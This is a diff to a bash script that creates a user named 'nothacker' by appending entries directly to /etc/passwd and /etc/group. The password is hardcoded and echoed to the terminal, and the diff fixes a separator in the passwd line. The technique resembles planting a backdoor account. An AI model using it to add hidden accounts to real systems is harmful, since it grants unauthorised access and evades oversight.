@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #new user info
-username="not-a-hacker"
+username="nothacker"
 password="ThisIsAV3ryS3curePa55word"
 home="/"
 idnum=1010
@@ -13,7 +13,7 @@ echo $password
 echo $passwordhash
 
 #creating a new user manually
-echo "$username:x:$idnum:$idnum:,,,;$home:/bin/bash" >> /etc/passwd
+echo "$username:x:$idnum:$idnum:,,,:$home:/bin/bash" >> /etc/passwd
 echo "$username:x:$idnum:" >> /etc/group
 #chown -R "$username:$username" "$home"
 #chmod -R 0755 $home
